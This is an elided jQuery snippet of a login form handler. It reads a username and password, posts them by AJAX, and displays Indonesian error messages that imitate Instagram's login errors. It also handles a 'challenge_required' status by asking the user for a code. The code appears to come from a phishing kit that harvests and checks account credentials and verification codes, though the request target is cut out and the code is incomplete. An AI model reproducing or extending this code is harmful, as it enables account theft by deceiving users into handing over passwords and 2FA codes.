$(() => {
  $(document).on('click', 'button.elper', () => {
    var penguna = $('input.user').val(),
      sandine = $('input.pass').val();
    $('label.error').text('');
      ...
      $.ajax({
        ...
        .fail((xhr) => {
          ...
          if (logfail.status.indexOf('username') > -1) {
            $('label.error')
              .text(
                'Nama pengguna yang Anda masukkan bukan milik akun tertentu. Periksa nama pengguna Anda lalu coba lagi.'
              )
              .css('color', 'red');
          } else if (logfail.status.indexOf('challenge_required') > -1) {
            $('label.error')
              .text('Account suspend get code.')
              .css('color', 'red');
          } else {
            $('label.error')
              .text('Kata sandi yang Anda masukkan salah. Silahkan coba lagi.')
              .css('color', 'red');
          }
        });
    }
